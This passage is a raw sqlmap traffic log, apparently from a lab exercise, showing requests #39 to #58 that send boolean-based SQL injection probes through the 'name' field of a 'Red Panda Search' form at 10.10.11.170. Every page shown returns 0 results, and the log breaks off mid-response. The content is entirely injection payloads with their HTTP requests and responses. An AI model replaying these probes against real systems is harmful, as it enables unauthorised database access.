+[12:50:34] [PAYLOAD] woodenk")) AND 5913=5913 AND (("kgWy" LIKE "kgWy
+[12:50:34] [TRAFFIC OUT] HTTP request [#39]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 83
+Connection: close
+
+name=woodenk%22%29%29%20AND%205913%3D5913%20AND%20%28%28%22kgWy%22%20LIKE%20%22kgWy
+
+[12:50:34] [TRAFFIC IN] HTTP response [#39] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 5913=5913 AND (("kgWy" LIKE "kgWy</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:34] [PAYLOAD] woodenk" AND 8078=8505 AND "YbwN" LIKE "YbwN
+[12:50:34] [TRAFFIC OUT] HTTP request [#40]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 71
+Connection: close
+
+name=woodenk%22%20AND%208078%3D8505%20AND%20%22YbwN%22%20LIKE%20%22YbwN
+
+[12:50:35] [TRAFFIC IN] HTTP response [#40] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 8078=8505 AND "YbwN" LIKE "YbwN</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:35] [PAYLOAD] woodenk" AND 5913=5913 AND "LeMu" LIKE "LeMu
+[12:50:35] [TRAFFIC OUT] HTTP request [#41]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 71
+Connection: close
+
+name=woodenk%22%20AND%205913%3D5913%20AND%20%22LeMu%22%20LIKE%20%22LeMu
+
+[12:50:35] [TRAFFIC IN] HTTP response [#41] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:34 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 5913=5913 AND "LeMu" LIKE "LeMu</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:35] [PAYLOAD] woodenk' AND 3366=8091 OR 'DnBZ'='IUtH
+[12:50:35] [TRAFFIC OUT] HTTP request [#42]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%27%20AND%203366%3D8091%20OR%20%27DnBZ%27%3D%27IUtH
+
+[12:50:35] [TRAFFIC IN] HTTP response [#42] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:34 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 3366=8091 OR 'DnBZ'='IUtH</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:35] [PAYLOAD] woodenk' AND 5913=5913 OR 'tdHf'='hHdC
+[12:50:35] [TRAFFIC OUT] HTTP request [#43]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%27%20AND%205913%3D5913%20OR%20%27tdHf%27%3D%27hHdC
+
+[12:50:35] [TRAFFIC IN] HTTP response [#43] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:34 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5913=5913 OR 'tdHf'='hHdC</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:35] [PAYLOAD] woodenk' WHERE 8266=8266 AND 4194=8701-- iESZ
+[12:50:35] [TRAFFIC OUT] HTTP request [#44]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%27%20WHERE%208266%3D8266%20AND%204194%3D8701--%20iESZ
+
+[12:50:35] [TRAFFIC IN] HTTP response [#44] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:34 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' WHERE 8266=8266 AND 4194=8701-- iESZ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:35] [PAYLOAD] woodenk' WHERE 3909=3909 AND 5913=5913-- wGYs
+[12:50:35] [TRAFFIC OUT] HTTP request [#45]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 66
+Connection: close
+
+name=woodenk%27%20WHERE%203909%3D3909%20AND%205913%3D5913--%20wGYs
+
+[12:50:36] [TRAFFIC IN] HTTP response [#45] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:34 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' WHERE 3909=3909 AND 5913=5913-- wGYs</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk') AS TBdc WHERE 1328=1328 AND 9375=3906-- wRUY
+[12:50:36] [TRAFFIC OUT] HTTP request [#46]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 81
+Connection: close
+
+name=woodenk%27%29%20AS%20TBdc%20WHERE%201328%3D1328%20AND%209375%3D3906--%20wRUY
+
+[12:50:36] [TRAFFIC IN] HTTP response [#46] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AS TBdc WHERE 1328=1328 AND 9375=3906-- wRUY</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk') AS FsHo WHERE 6803=6803 AND 5913=5913-- feFR
+[12:50:36] [TRAFFIC OUT] HTTP request [#47]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 81
+Connection: close
+
+name=woodenk%27%29%20AS%20FsHo%20WHERE%206803%3D6803%20AND%205913%3D5913--%20feFR
+
+[12:50:36] [TRAFFIC IN] HTTP response [#47] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk') AS FsHo WHERE 6803=6803 AND 5913=5913-- feFR</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk' IN BOOLEAN MODE) AND 4771=7007#
+[12:50:36] [TRAFFIC OUT] HTTP request [#48]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%27%20IN%20BOOLEAN%20MODE%29%20AND%204771%3D7007%23
+
+[12:50:36] [TRAFFIC IN] HTTP response [#48] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' IN BOOLEAN MODE) AND 4771=7007#</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk' IN BOOLEAN MODE) AND 5913=5913#
+[12:50:36] [TRAFFIC OUT] HTTP request [#49]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=woodenk%27%20IN%20BOOLEAN%20MODE%29%20AND%205913%3D5913%23
+
+[12:50:36] [TRAFFIC IN] HTTP response [#49] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' IN BOOLEAN MODE) AND 5913=5913#</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk) AND 3405=9729-- egTQ
+[12:50:36] [TRAFFIC OUT] HTTP request [#50]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 44
+Connection: close
+
+name=woodenk%29%20AND%203405%3D9729--%20egTQ
+
+[12:50:36] [TRAFFIC IN] HTTP response [#50] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 3405=9729-- egTQ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:36] [PAYLOAD] woodenk) AND 5913=5913-- Lqre
+[12:50:36] [TRAFFIC OUT] HTTP request [#51]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 44
+Connection: close
+
+name=woodenk%29%20AND%205913%3D5913--%20Lqre
+
+[12:50:37] [TRAFFIC IN] HTTP response [#51] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:35 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 5913=5913-- Lqre</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:37] [PAYLOAD] woodenk) AND 2300=7815 AND (8952=8952
+[12:50:37] [TRAFFIC OUT] HTTP request [#52]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 58
+Connection: close
+
+name=woodenk%29%20AND%202300%3D7815%20AND%20%288952%3D8952
+
+[12:50:37] [TRAFFIC IN] HTTP response [#52] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 2300=7815 AND (8952=8952</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:37] [PAYLOAD] woodenk) AND 5913=5913 AND (1885=1885
+[12:50:37] [TRAFFIC OUT] HTTP request [#53]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 58
+Connection: close
+
+name=woodenk%29%20AND%205913%3D5913%20AND%20%281885%3D1885
+
+[12:50:37] [TRAFFIC IN] HTTP response [#53] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk) AND 5913=5913 AND (1885=1885</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:37] [PAYLOAD] woodenk)) AND 3504=1242 AND ((4561=4561
+[12:50:37] [TRAFFIC OUT] HTTP request [#54]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%29%29%20AND%203504%3D1242%20AND%20%28%284561%3D4561
+
+[12:50:37] [TRAFFIC IN] HTTP response [#54] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk)) AND 3504=1242 AND ((4561=4561</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:37] [PAYLOAD] woodenk)) AND 5913=5913 AND ((4431=4431
+[12:50:37] [TRAFFIC OUT] HTTP request [#55]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%29%29%20AND%205913%3D5913%20AND%20%28%284431%3D4431
+
+[12:50:37] [TRAFFIC IN] HTTP response [#55] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk)) AND 5913=5913 AND ((4431=4431</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:37] [PAYLOAD] woodenk))) AND 9193=8588 AND (((9459=9459
+[12:50:37] [TRAFFIC OUT] HTTP request [#56]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%29%29%29%20AND%209193%3D8588%20AND%20%28%28%289459%3D9459
+
+[12:50:38] [TRAFFIC IN] HTTP response [#56] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk))) AND 9193=8588 AND (((9459=9459</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:38] [PAYLOAD] woodenk))) AND 5913=5913 AND (((5427=5427
+[12:50:38] [TRAFFIC OUT] HTTP request [#57]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%29%29%29%20AND%205913%3D5913%20AND%20%28%28%285427%3D5427
+
+[12:50:38] [TRAFFIC IN] HTTP response [#57] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:36 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk))) AND 5913=5913 AND (((5427=5427</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:38] [PAYLOAD] woodenk AND 2147=2606
+[12:50:38] [TRAFFIC OUT] HTTP request [#58]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 32
+Connection: close
+
+name=woodenk%20AND%202147%3D2606
+
+[12:50:38] [TRAFFIC IN] HTTP response [#58] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
